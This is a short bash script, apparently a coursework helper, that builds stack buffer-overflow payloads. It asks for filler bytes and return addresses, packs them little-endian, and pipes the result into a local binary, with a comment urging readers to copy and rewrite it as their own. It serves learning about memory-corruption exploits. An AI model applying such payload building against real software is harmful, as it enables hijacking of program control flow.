#!/bin/bash

# IMPORTANT! COPY THE CODE AND REWRITE IT IN YOUR OWN BASH SCRIPT FILE

# $1 = exec (ex: attack)
# $2 = nr of addrs (ints) to overwrite (ask the magician, WinRaRes `~`~`\(^0^), for help if you are stuck)
# use format: ./IOCLA_HESOIAM attack 1 or ./IOCLA_HESOIAM attack 4

echo "Number of bytes to overwrite for buffer: "
read BYTES
new_addr="$BYTES * \"A\""
i=1
while [ $i -le $2 ]
do
    
    echo "Address or number $i (int) used to overwrite on stack: "
    read ADDR

    NIB1=${ADDR:0:2} #first nibble from left to right
    NIB2=${ADDR:2:2}
    NIB3=${ADDR:4:2}
    NIB4=${ADDR:6:2} #last nibble from left to right

    new_bytes=" + \"\\x$NIB4\\x$NIB3\\x$NIB2\\x$NIB1\"" #the address/number to overwrite on stack (new bytes)

    if [ $i -lt $2 ]
    then
        echo "How many bytes to add after the address/number (0 or multiple of 4): "
        read mult_four #number of bytes between addresses (if more than one, otherwise set to 0)
        add_bytes=" + $mult_four * \"A\""
        new_bytes="$new_bytes$add_bytes" #concatenates the strings that contain the new bytes and the filler (padding)
    fi
    new_addr="$new_addr$new_bytes" #concatenates the strings that contain the current bytes and the new bytes that overwrite

    i=$(( $i + 1 ))
done

    python2 -c "print $new_addr" | ./$1
